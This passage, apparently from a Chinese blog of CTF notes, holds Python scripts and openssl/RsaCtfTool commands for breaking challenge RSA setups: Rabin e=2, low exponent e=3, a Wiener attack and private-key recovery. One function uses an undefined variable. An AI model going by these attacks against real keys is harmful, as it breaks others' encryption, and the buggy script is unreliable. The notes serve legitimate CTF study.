class="number">2</span>:]).decode(<span class="string">"utf8"</span>))</span><br><span class="line">    <span class="keyword">except</span> binascii.Error <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"位数非偶数，跳过..."</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<h3 id="已知p-q-e-2"><a href="#已知p-q-e-2" class="headerlink" title="已知p,q,e=2"></a>已知p,q,e=2</h3><p>以文件形式给出参数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># 适合e=2</span></span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取公钥参数</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./tmp/pubkey.pem'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.importKey(f)</span><br><span class="line">    N = key.n</span><br><span class="line">    e = key.e</span><br><span class="line">    </span><br><span class="line">p = <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q = <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./tmp/flag.enc'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = f.read().encode(<span class="string">'hex'</span>)</span><br><span class="line">    cipher = string.atoi(cipher, base=<span class="number">16</span>)</span><br><span class="line">    <span class="comment"># print cipher</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算yp和yq</span></span><br><span class="line">yp = gmpy.invert(p,q)</span><br><span class="line">yq = gmpy.invert(q,p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算mp和mq</span></span><br><span class="line">mp = pow(cipher, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">mq = pow(cipher, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算a,b,c,d</span></span><br><span class="line">a = (yp * p * mq + yq * q * mp) % N</span><br><span class="line">b = N - int(a)</span><br><span class="line">c = (yp * p * mq - yq * q * mp) % N</span><br><span class="line">d = N - int(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (a,b,c,d):</span><br><span class="line">    s = <span class="string">'%x'</span> % i</span><br><span class="line">    <span class="keyword">if</span> len(s) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        s = <span class="string">'0'</span> + s</span><br><span class="line">    <span class="keyword">print</span> s.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure></p>
<h3 id="低加密指数e-3"><a href="#低加密指数e-3" class="headerlink" title="低加密指数e=3"></a>低加密指数e=3</h3><p>以文件形式给出参数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">public_key = <span class="string">"./tmp/pubkey.pem"</span></span><br><span class="line">cipher_file = <span class="string">"./tmp/flag.enc"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#读入公钥</span></span><br><span class="line"><span class="keyword">with</span> open(public_key, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.importKey(f)</span><br><span class="line">    n = key.n</span><br><span class="line">    e = key.e</span><br><span class="line"></span><br><span class="line"><span class="comment">#读入密文</span></span><br><span class="line"><span class="keyword">with</span> open(cipher_file, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = f.read().encode(<span class="string">"hex"</span>)</span><br><span class="line">    cipher = int(cipher, <span class="number">16</span>)</span><br><span class="line">    <span class="comment">#print(cipher)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#破解密文</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">()</span>:</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span>(gmpy2.iroot(cipher+i*n, <span class="number">3</span>)[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">            flag_bin = int(gmpy2.iroot(cipher+x*n, <span class="number">3</span>)[<span class="number">0</span>])</span><br><span class="line">            flag = hex(flag_bin)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">"hex"</span>)</span><br><span class="line">            print(flag) </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_for</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">118600000</span>, <span class="number">118720000</span>):</span><br><span class="line">        <span class="keyword">if</span>(gmpy2.iroot(cipher+x*n, <span class="number">3</span>)[<span class="number">1</span>] == <span class="number">1</span>):</span><br><span class="line">            flag_bin = int(gmpy2.iroot(cipher+x*n, <span class="number">3</span>)[<span class="number">0</span>])</span><br><span class="line">            flag = hex(flag_bin)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">"hex"</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    get_flag_for()</span><br><span class="line">    <span class="comment">#get_flag()</span></span><br></pre></td></tr></table></figure></p>
<h3 id="利用openssl解密-已知pubkey-pem和flag-enc"><a href="#利用openssl解密-已知pubkey-pem和flag-enc" class="headerlink" title="利用openssl解密(已知pubkey.pem和flag.enc)"></a>利用openssl解密(已知pubkey.pem和flag.enc)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 转换pem为ne格式</span></span><br><span class="line">openssl rsa -pubin -text -modulus -<span class="keyword">in</span> pubkey.pem</span><br><span class="line"><span class="comment"># 使用私钥解密</span></span><br><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> flag.enc -inkey private.pem -out flag.dec</span><br></pre></td></tr></table></figure>
<p>分解pqd后用脚本解密<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">keypair = RSA.generate(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">keypair.p = <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">keypair.q = <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">keypair.e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">keypair.n = keypair.p * keypair.q</span><br><span class="line">Qn = long((keypair.p<span class="number">-1</span>) * (keypair.q<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    x = (Qn * i ) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (x % keypair.e == <span class="number">0</span>):</span><br><span class="line">        keypair.d = x / keypair.e</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">private = open(<span class="string">'private.pem'</span>,<span class="string">'w'</span>)</span><br><span class="line">private.write(keypair.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure></p>
<h3 id="RsaCtfTool"><a href="#RsaCtfTool" class="headerlink" title="RsaCtfTool"></a>RsaCtfTool</h3><p>因为是现成的工具,所以这里记录用法<br>例子: 已知ne,e特别大,进行wiener attack<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 把n,e转换为pem格式</span></span><br><span class="line">python RsaCtfTool.py --createpub -n xxx -e xxx &gt; test.pem</span><br><span class="line"><span class="comment"># 已知公钥求私钥</span></span><br><span class="line">python RsaCtfTool.py --publickey test.pem --private &gt; test.key</span><br><span class="line"><span class="comment"># 已知公钥文件和加密文件</span></span><br><span class="line">python RsaCtfTool.py --publickey xxx.pem --uncipherfile xxx.txt</span><br><span class="line"><span class="comment"># 把pem格式的公钥转换为n,e</span></span><br><span class="line">python RsaCtfTool.py --key test.key --dumpkey</span><br></pre></td></tr></table></figure></p>
<p>得到nedpq值后通过脚本解密<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf8 -</span></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span>   <span class="comment">#求最大公约数</span></span><br><span class="line">    <span class="keyword">if</span> a &lt; b:</span><br><span class="line">        a, b = b, a</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        temp = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = temp</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a,b)</span>:</span>         <span class="comment">#扩展欧几里得算法</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span>  (b,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g,y,x=egcd(b%a,a)</span><br><span class="line">        <span class="keyword">return</span> (g,x-(b//a)*y,y)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a,m)</span>:</span></span><br><span class="line">    g,x,y=egcd(a,m)</span><br><span class="line">    <span class="keyword">if</span> g!=<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x%m</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    p =<span class="number">15991846970993213322072626901560749932686325766403404864023341810735319249066370916090640926219079368845510444031400322229147771682961132420481897362843199</span></span><br><span class="line">    q =<span class="number">28805791771260259486856902729020438686670354441296247148207862836064657849735343618207098163901787287368569768472521344635567334299356760080507454640207003</span></span><br><span class="line">    e = <span class="number">354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span></span><br><span class="line">    d =modinv(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">    c =<span class="number">38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192</span></span><br><span class="line">    n =p*q</span><br><span class="line">    m = pow(c,d,n)</span><br><span class="line">    <span class="keyword">print</span> n2s(m)</span><br></pre></td></tr></table></figure></p>
<h3 id="私钥恢复"><a href="#私钥恢复" class="headerlink" title="私钥恢复"></a>私钥恢复</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/!usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment"># 恢复公钥</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">public_key_file = <span class="string">"./tmp/pubkey.pem"</span></span><br><span class="line"><span class="keyword">with</span> open(public_key_file, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    public_key = RSA.importKey(f)</span><br><span class="line">    n = public_key.n</span><br><span class="line">    e = public_key.e</span><br><span class="line">print(<span class="string">"n=\n%s\ne=\n%s"</span>%(n,e))</span><br><span class="line"></span><br><span class="line"><span class="comment"># wqm @ wqm-top in ~/下载/i春秋/密码/RSA脚本整理/5私钥恢复和最优非对称加密填充/ISC2016训练赛——phrackCTF--600--godlikeRSA [22:24:30] </span></span><br><span class="line">$ cat get_private_key.py </span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#私钥修复</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> invmod, gcd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_linear</span><span class="params">(a, b, mod)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a &amp; <span class="number">1</span> == <span class="number">0</span> <span class="keyword">or</span> b &amp; <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> (b * invmod(a, mod)) &amp; (mod - <span class="number">1</span>)  <span class="comment"># hack for mod = power of 2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_n</span><span class="params">(s)</span>:</span></span><br><span class="line">    s = re.sub(<span class="string">r"[^0-9a-f]"</span>, <span class="string">""</span>, s)</span><br><span class="line">    <span class="keyword">return</span> int(s, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msk</span><span class="params">(s)</span>:</span></span><br><span class="line">    cleaned = <span class="string">""</span>.join(map(<span class="keyword">lambda</span> x: x[<span class="number">-2</span>:], s.split(<span class="string">":"</span>)))</span><br><span class="line">    <span class="keyword">return</span> msk_ranges(cleaned), msk_mask(cleaned), msk_val(cleaned)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msk_ranges</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [range(<span class="number">16</span>) <span class="keyword">if</span> c == <span class="string">" "</span> <span class="keyword">else</span> [int(c, <span class="number">16</span>)] <span class="keyword">for</span> c <span class="keyword">in</span> s]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msk_mask</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(<span class="string">""</span>.join(<span class="string">"0"</span> <span class="keyword">if</span> c == <span class="string">" "</span> <span class="keyword">else</span> <span class="string">"f"</span> <span class="keyword">for</span> c <span class="keyword">in</span> s), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msk_val</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(<span class="string">""</span>.join(<span class="string">"0"</span> <span class="keyword">if</span> c == <span class="string">" "</span> <span class="keyword">else</span> c <span class="keyword">for</span> c <span class="keyword">in</span> s), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">E = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">N = to_n(<span class="string">"""00:c0:97:78:53:45:64:84:7d:8c:c4:b4:20:e9:33:</span></span><br><span class="line"><span class="string">    58:67:ec:78:3e:6c:f5:f0:5c:a0:3e:ee:dc:25:63:</span></span><br><span class="line"><span class="string">    d0:eb:2a:9e:ba:8f:19:52:a2:67:0b:e7:6e:b2:34:</span></span><br><span class="line"><span class="string">    b8:6d:50:76:e0:6a:d1:03:cf:77:33:d8:b1:e9:d7:</span></span><br><span class="line"><span class="string">    3b:e5:eb:1c:65:0c:25:96:fd:96:20:b9:7a:de:1d:</span></span><br><span class="line"><span class="string">    bf:fd:f2:b6:bf:81:3e:3e:47:44:43:98:bf:65:2f:</span></span><br><span class="line"><span class="string">    67:7e:27:75:f9:56:47:ba:c4:f0:4e:67:2b:da:e0:</span></span><br><span class="line"><span class="string">    1a:77:14:40:29:c1:a8:67:5a:8f:f5:2e:be:8e:82:</span></span><br><span class="line"><span class="string">    31:3d:43:26:d4:97:86:29:15:14:a9:69:36:2c:76:</span></span><br><span class="line"><span class="string">    ed:b5:90:eb:ec:6f:ce:d5:ca:24:1c:aa:f6:63:f8:</span></span><br><span class="line"><span class="string">    06:a2:62:cb:26:74:d3:5b:82:4b:b6:d5:e0:49:32:</span></span><br><span class="line"><span class="string">    7b:62:f8:05:c4:f7:0e:86:59:9b:f3:17:25:02:aa:</span></span><br><span class="line"><span class="string">    3c:97:78:84:7b:16:fd:1a:f5:67:cf:03:17:97:d0:</span></span><br><span class="line"><span class="string">    c6:69:85:f0:8d:fa:ce:ee:68:24:63:06:24:e1:e4:</span></span><br><span class="line"><span class="string">    4c:f8:e9:ad:25:c7:e0:c0:15:bb:b4:67:48:90:03:</span></span><br><span class="line"><span class="string">    9b:20:7f:0c:17:eb:9d:13:44:ab:ab:08:a5:c3:dc:</span></span><br><span class="line"><span class="string">    c1:98:88:c5:ce:4f:5a:87:9b:0b:bf:bd:d7:0e:a9:</span></span><br><span class="line"><span class="string">    09:59:81:fa:88:4f:59:60:6b:84:84:ad:d9:c7:25:</span></span><br><span class="line"><span class="string">    8c:e8:c0:e8:f7:26:9e:37:95:7c:e1:48:29:0f:51:</span></span><br><span class="line"><span class="string">    e7:bd:98:2f:f6:cc:80:e7:f0:32:0b:89:51:92:4e:</span></span><br><span class="line"><span class="string">    c2:6d:50:53:2b:3b:77:72:d1:bd:1a:1f:92:d7:12:</span></span><br><span class="line"><span class="string">    79:61:61:c5:a4:7e:b3:85:eb:f0:7c:6d:46:03:c5:</span></span><br><span class="line"><span class="string">    e6:d5:81:2c:ba:7e:ea:8d:51:7d:63:55:34:2a:b6:</span></span><br><span class="line"><span class="string">    d4:dc:31:5a:f1:99:e3:dc:8c:83:0b:a2:2a:d5:3c:</span></span><br><span class="line"><span class="string">    41:48:41:54:1a:a9:e8:b6:70:bf:d3:fe:ed:19:17:</span></span><br><span class="line"><span class="string">    14:94:13:b3:17:e3:8b:8e:6f:53:ed:e2:44:e8:4a:</span></span><br><span class="line"><span class="string">    32:d6:5c:0d:a8:80:f5:fc:02:e9:46:55:d5:a4:d3:</span></span><br><span class="line"><span class="string">    e7:c6:30:77:f9:73:e9:44:52:d8:13:9d:5d:bf:9e:</span></span><br><span class="line"><span class="string">    fa:3a:b5:96:79:82:5b:cd:19:5c:06:a9:00:96:fd:</span></span><br><span class="line"><span class="string">    4c:a4:73:88:1a:ec:3c:11:de:b9:3d:e0:50:00:1e:</span></span><br><span class="line"><span class="string">    ac:21:97:a1:96:7d:6b:15:f9:6c:c9:34:7f:70:d7:</span></span><br><span class="line"><span class="string">    9d:2d:d1:48:4a:81:71:f8:12:dd:32:ba:64:31:60:</span></span><br><span class="line"><span class="string">    08:26:4b:09:22:03:83:90:17:7f:f3:a7:72:57:bf:</span></span><br><span class="line"><span class="string">    89:6d:e4:d7:40:24:8b:7b:bd:df:33:c0:ff:30:2e:</span></span><br><span class="line"><span class="string">    e8:6c:1d"""</span>)</span><br><span class="line"></span><br><span class="line">p_ranges, pmask_msk, pmask_val = msk(<span class="string">""" 0: e:  :  :  :c 